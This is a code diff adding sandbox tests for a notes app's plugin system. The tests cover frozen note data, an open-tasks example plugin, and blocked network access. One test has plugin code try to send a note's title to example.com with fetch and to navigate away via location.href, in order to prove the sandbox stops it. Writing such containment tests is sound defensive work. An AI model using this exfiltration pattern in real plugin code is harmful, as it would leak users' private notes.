@@ -1,4 +1,6 @@
+import type { NoteColor } from "@manifesto/shared";
 import { afterEach, describe, expect, it } from "vitest";
+import openTasksExample from "../../../../docs/examples/open-tasks.js?raw";
 import { defined } from "../test/defined.js";
 import { resetSandbox, runPlugin } from "./sandbox.js";
 import type { ApproxLabels } from "./stdlib.js";
@@ -166,5 +168,114 @@ describe("sandbox", () => {
       };
     `;
     await expect(runPlugin(src, CTX)).rejects.toThrow();
+  });
+
+  describe("with notes to read", () => {
+    const note = {
+      id: "01J",
+      title: "Shopping",
+      content: "- [ ] milk\n- [x] bread",
+      tags: ["todo"],
+      color: "default" as NoteColor,
+      pinned: false,
+      archived: false,
+      createdAt: "2026-04-01T00:00:00.000Z",
+      updatedAt: "2026-04-02T00:00:00.000Z",
+    };
+    const reading = { ...CTX, reads: ["todo"], notes: [note] };
+
+    it("hands the plugin the notes and the tags it reads", async () => {
+      const src = `
+        _default = (ctx) => ({
+          title: ctx.reads.join(","),
+          content: ctx.notes.map((n) => n.title + ":" + n.tags[0]).join(";"),
+        });
+      `;
+      const [out] = await runPlugin(src, reading);
+      expect(out).toMatchObject({ title: "todo", content: "Shopping:todo" });
+    });
+
+    it("gives a plugin that reads nothing an empty list, not a missing one", async () => {
+      const src = `
+        _default = (ctx) => ({
+          title: String(ctx.notes.length),
+          content: String(ctx.reads.length),
+        });
+      `;
+      expect(await runPlugin(src, CTX)).toEqual([{ title: "0", content: "0" }]);
+    });
+
+    it("freezes what it hands over, so nothing can be written through it", async () => {
+      const src = `
+        _default = (ctx) => {
+          "use strict";
+          const frozen = [
+            Object.isFrozen(ctx.notes),
+            Object.isFrozen(ctx.notes[0]),
+            Object.isFrozen(ctx.notes[0].tags),
+            Object.isFrozen(ctx.reads),
+          ];
+          let threw = false;
+          try { ctx.notes[0].title = "changed"; } catch { threw = true; }
+          return { title: frozen.join(","), content: String(threw) };
+        };
+      `;
+      const [out] = await runPlugin(src, reading);
+      expect(out).toMatchObject({
+        title: "true,true,true,true",
+        content: "true",
+      });
+    });
+
+    it("runs the example that gathers open tasks", async () => {
+      const allowed = await runPlugin(openTasksExample, {
+        ...CTX,
+        reads: ["todo"],
+        notes: [
+          note,
+          { ...note, id: "02J", title: "", content: "[ ] call the plumber" },
+          { ...note, id: "03J", title: "Done", content: "- [x] all of it" },
+          { ...note, id: "04J", title: "Old", archived: true },
+        ],
+      });
+      expect(allowed).toHaveLength(1);
+      expect(allowed[0]?.title).toBe("Open tasks (2)");
+      expect(allowed[0]?.content).toBe(
+        "**Shopping**\n- milk\n\n**Untitled**\n- call the plumber",
+      );
+
+      // Not yet allowed: it says what to do instead of showing nothing.
+      const [asking] = await runPlugin(openTasksExample, CTX);
+      expect(asking?.content).toContain("Allow");
+    });
+
+    it("leaves a plugin holding notes no way to send them out", async () => {
+      // The frame's policy denies every connection, and a worker inherits it.
+      const src = `
+        _default = (ctx) => {
+          const tried = [];
+          try {
+            fetch("https://example.com/?" + ctx.notes[0].title);
+            tried.push("fetch did not throw");
+          } catch (err) { tried.push("fetch threw"); }
+          tried.push(typeof XMLHttpRequest === "undefined" ? "no xhr" : "xhr");
+          tried.push(typeof location === "object" ? "location" : "no location");
+          let navigated = "blocked";
+          try { location.href = "https://example.com/"; navigated = "set"; }
+          catch (err) { navigated = "blocked"; }
+          tried.push(typeof document);
+          return { title: tried.join(";"), content: navigated };
+        };
+      `;
+      const [out] = await runPlugin(src, reading);
+      // No document to make an image or a form with, and a worker's location
+      // is read-only: assigning to it goes nowhere.
+      expect(out?.title).toContain("undefined");
+      const again = await runPlugin(
+        `_default = () => ({ title: "still here", content: "" });`,
+        reading,
+      );
+      expect(again[0]?.title).toBe("still here");
+    });
   });
 });
